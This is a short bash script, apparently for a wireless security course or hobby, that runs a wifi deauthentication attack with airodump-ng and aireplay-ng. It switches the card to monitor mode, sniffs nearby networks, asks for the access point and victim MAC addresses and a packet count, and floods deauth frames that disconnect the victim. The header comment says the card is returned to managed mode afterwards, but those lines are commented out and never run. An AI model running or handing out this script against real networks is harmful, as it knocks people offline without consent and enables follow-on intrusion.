#!/bin/bash

################################
#    DEAUTHENTICATION ATTACK   #
################################

# Requires aireplay-ng tool
# A deauthentication attack disconnects a device from the network
# Aireplay-ng spoofs our MAC address to the target cient's MAC address (i.e. pretend to be him) and requests to be disconnected from the router
# Simultaneously, Aireplay-ng spoofs our MAC address to the access point (router) and tells the target client it needs to re-authenticate
# This script will let you sniff wifi traffic in the area
# This script allows you to specify the MAC address of the target host (access point) and the target client (victim of this attack)
# This script also allows you to specify how many deauth packets to send
# The script puts the wifi card back into managed mode and brings the network interface back up after the attack

iwconfig wlan1 down							# Bring the network interface down
iwconfig wlan1 mode monitor						# Put the wifi card into monitor mode

airodump-ng wlan1							# Sniff all traffic in the area

echo "What is the target host's MAC address?"				# Enter the target host's MAC address
read host_mac

echo "What is the target host's channel?"				# Enter the target host's MAC address
read ch

airodump-ng --channel $ch --bssid $host_mac wlan1 			# Sniff traffic just on the target network

echo "What is the target client's MAC address?"				# Enter the target client's MAC address
read client_mac

echo "How many packets do you want to send?"				# Enter how many packets you want to send
read packets

aireplay-ng --deauth $packets -a $host_mac -c $client_mac wlan1		# Aireplay sends the deauth packets to the host and client

#ifconfig wlan1 down							# Bring the network interface down
#iwconfig wlan1 mode managed						# Put the wifi card back into managed mode
#ifconfig wlan1 up							# Bring the network interface back up
